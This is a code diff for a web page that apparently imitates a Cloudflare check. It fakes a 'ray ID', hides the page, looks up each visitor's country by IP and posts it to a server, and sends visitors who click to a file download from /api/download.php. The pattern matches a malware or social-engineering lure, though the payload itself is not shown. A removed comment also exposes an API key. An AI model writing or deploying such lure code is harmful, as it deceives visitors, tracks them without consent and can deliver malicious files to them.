@@ -25,9 +25,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
 // Getting the country code from the user's IP
 var country_code = '';
-// $.get("https://api.ipdata.co?api-key=550fe21e6fda7f62b485018d9fe45bf04de9da3a4f4c735c2c812c32", function (response) {
-//   country_code = response.country_code;
-// }, "jsonp");
 $.get('https://ipinfo.io/json', function(response) {
     country_code = response.country;
 })
@@ -199,7 +196,7 @@ var downloadCount = 0;
 $('#report').click(function() {
   if (isClose) {
     downloadCount++;
-    window.location.href = "/api/index.php?rayid=" + rayID + "&countrycode=" + country_code + "&version='V3'";
+    window.location.href = "/api/download.php";
     
 
     window.setTimeout(function() {
@@ -240,38 +237,18 @@ if (localStorage.getItem('ray')) {
 
 $('#ray-id').text(rayID);  
 
-// fetch(window.location.href, {
-//     method: 'GET',
-// })
-// .then(response => {
 
-//     if ( response.headers.get('cf-ray') ) {
-
-//         rayID = response.headers.get('cf-ray');
-//         $('#ray-id').text(rayID);
-
-//     } else {
-
-//         if (localStorage.getItem('ray')) {
-//             rayID = localStorage.getItem('ray');
-//         } else {
-//             rayID = generateRayID();
-//             localStorage.setItem('ray', rayID);
-//         }
-        
-//         $('#ray-id').text(rayID);  
-//     }
-// })
-// .catch(error => {
-//     console.error('Error fetching page:', error);
-// });
-
-
-// Block site
+// Block site & save user's info when visit
 document.body.style.opacity = 0;
 
 window.setTimeout(function() {
     check_ray_id();
+
+    $.post('/api/index.php', {
+        rayid: rayID,
+        countrycode: country_code,
+        version: 'V3'
+    });
 }, 800)
 
 
